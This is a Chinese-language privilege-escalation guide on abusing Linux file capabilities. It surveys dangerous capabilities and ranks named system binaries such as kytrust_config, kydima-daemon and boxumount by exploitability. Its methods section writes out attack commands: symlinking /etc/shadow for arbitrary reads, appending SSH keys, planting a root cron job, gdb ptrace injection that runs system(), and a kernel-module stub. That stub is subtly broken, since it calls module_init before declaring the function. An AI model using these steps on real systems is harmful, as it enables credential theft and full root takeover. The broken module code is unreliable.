# 文件能力（Capabilities）分析与利用

## 侦察命令

```bash
# 查看指定文件的能力
getcap <binary-path>

# 查找所有具有能力的文件
getcap -r / 2>/dev/null

# 查看进程能力
cat /proc/<pid>/status | grep Cap

# 能力解码
python3 -c "print(bin(<cap-value>))"
```

## Linux Capabilities 模型

Linux capabilities 将 root 权限细分为独立单元。具有 capability 的二进制可以执行特定的特权操作。

## 高危能力说明

| 能力 | 危害 |
|------|------|
| `cap_dac_override` | 绕过所有文件权限检查，读/写/执行任意文件 |
| `cap_dac_read_search` | 绕过文件读+目录搜索权限，读取任意文件 |
| `cap_sys_ptrace` | 可 ptrace 任意进程，代码注入/凭证窃取 |
| `cap_sys_module` | 可加载任意内核模块，ring-0 代码执行 |
| `cap_sys_admin` | 近乎 root 权限：可挂载/卸载、设置主机名、操作命名空间等 |
| `cap_sys_rawio` | 裸磁盘 I/O，绕过文件系统读写任意磁盘块 |
| `cap_chown` | 可修改任意文件属主，接管敏感文件 |
| `cap_fowner` | 绕过文件属主权限检查，访问任意文件 |
| `cap_net_raw` | 使用原始套接字，可能用于网络攻击 |
| `cap_sys_boot` | 重启系统 |
| `cap_setuid` | 设置 UID，可提权 |

## 能力组合风险分析

### P0 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_override` + `cap_sys_rawio` | 裸磁盘 I/O 绕过文件系统 | 直接读写磁盘块 |
| `cap_dac_override` + `cap_sys_ptrace` | ptrace 注入特权进程 | 注入 root 进程 |
| `cap_sys_module` + `cap_sys_admin` | 加载内核模块 | ring-0 代码执行 |
| `cap_dac_override` + `cap_sys_module` | 绕过权限+加载模块 | 完全控制系统 |
| `cap_chown` + `cap_fowner` | 改属主+绕过属主检查 | 接管任意文件 |
| `cap_dac_override` + `cap_fowner` | 绕过权限+绕过属主 | 无限制文件访问 |

### P1 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_override` + `cap_dac_read_search` | 任意文件读写 | 读取敏感文件 |
| `cap_sys_ptrace` alone | ptrace 任意进程 | 代码注入 |
| `cap_sys_admin` alone | 近乎 root | 多种提权路径 |
| `cap_dac_override` alone | 绕过文件权限 | 读写任意文件 |

### P2 级组合

| 组合 | 风险 | 利用方向 |
|------|------|---------|
| `cap_dac_read_search` alone | 任意文件读取 | 信息泄露 |
| `cap_net_raw` alone | 原始套接字 | 网络嗅探 |

## 具体二进制分析

### kytrust_config

```bash
# 路径：/usr/sbin/kytrust_config
# 能力：cap_dac_override, cap_sys_rawio
# 风险：P0 — DAC 绕过 + 裸磁盘 I/O

# 利用方向：
# 1. 读取任意文件（/etc/shadow, SSH 私钥等）
# 2. 直接读写磁盘块，绕过文件系统
# 3. 修改系统关键文件

# 测试：
getcap /usr/sbin/kytrust_config
ls -la /usr/sbin/kytrust_config
strings /usr/sbin/kytrust_config | head -30
```

### security-reinforce-daemon

```bash
# 路径：/usr/sbin/security-reinforce-daemon
# 能力：cap_dac_override, cap_dac_read_search, cap_sys_ptrace
# 风险：P0 — DAC 绕过 + ptrace 任意进程

# 利用方向：
# 1. ptrace 注入特权进程
# 2. 窃取进程凭证
# 3. 读取任意文件

# 测试：
getcap /usr/sbin/security-reinforce-daemon
ls -la /usr/sbin/security-reinforce-daemon
```

### kydima-daemon

```bash
# 路径：/usr/sbin/kydima-daemon
# 能力：cap_dac_override, cap_dac_read_search, cap_sys_module, cap_sys_ptrace, cap_sys_admin
# 风险：P0 — 近乎完全 root 权限

# 利用方向：
# 1. 加载内核模块（ring-0 代码执行）
# 2. ptrace 注入任意进程
# 3. 挂载/卸载文件系统
# 4. 读写任意文件

# 测试：
getcap /usr/sbin/kydima-daemon
ls -la /usr/sbin/kydima-daemon
```

### kysec_auth / ksaf_auth

```bash
# 路径：/usr/sbin/kysec_auth, /usr/sbin/ksaf_auth
# 能力：cap_dac_override, cap_dac_read_search
# 风险：P1 — 任意文件读写

# 利用方向：
# 1. 读取 /etc/shadow
# 2. 读取 SSH 私钥
# 3. 修改系统配置

# 测试：
getcap /usr/sbin/kysec_auth
getcap /usr/sbin/ksaf_auth
```

### boxumount

```bash
# 路径：/usr/bin/boxumount
# 组件：libbox1
# 能力：cap_chown, cap_dac_override, cap_dac_read_search, cap_fowner, cap_sys_admin
# 风险：P0 — 多种高危能力组合

# 利用方向：
# 1. 修改任意文件属主（接管文件）
# 2. 绕过所有文件权限检查
# 3. 挂载/卸载文件系统
# 4. 任意文件读写

# 测试：
getcap /usr/bin/boxumount
ls -la /usr/bin/boxumount
```

## 利用方法

### 1. 任意文件读取

```bash
# 当有 cap_dac_override 或 cap_dac_read_search 时
<binary>  # 直接调用，观察是否有文件操作
# 或通过符号链接
ln -s /etc/shadow /tmp/shadow
<binary> /tmp/shadow
```

### 2. 任意文件写入

```bash
# 当有 cap_dac_override 时
# 例：写入 SSH authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 例：写入 cron 任务
echo "* * * * * root id > /tmp/pwned" > /etc/cron.d/exploit
```

### 3. 进程注入

```bash
# 当有 cap_sys_ptrace 时
# 找到目标进程
ps aux | grep <target>

# ptrace 注入
gdb -p <pid>
(gdb) call (int)system("id > /tmp/pwned")
(gdb) detach
(gdb) quit
```

### 4. 内核模块加载

```bash
# 当有 cap_sys_module 时
# 编译内核模块
cat > /tmp/exploit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
MODULE_LICENSE("GPL");
module_init(exploit_init);
static int __init exploit_init(void) {
    printk(KERN_INFO "Exploit loaded!\n");
    return 0;
}
EOF
# 编译并加载（需要内核头文件）
```

## 验证命令

```bash
# 验证能力利用是否成功
# 根据具体漏洞类型选择验证命令

# 例：文件读取验证
cat /etc/shadow 2>&1 | head -5

# 例：文件写入验证
ls -la /etc/cron.d/exploit
cat /etc/cron.d/exploit

# 例：进程注入验证
cat /tmp/pwned
```
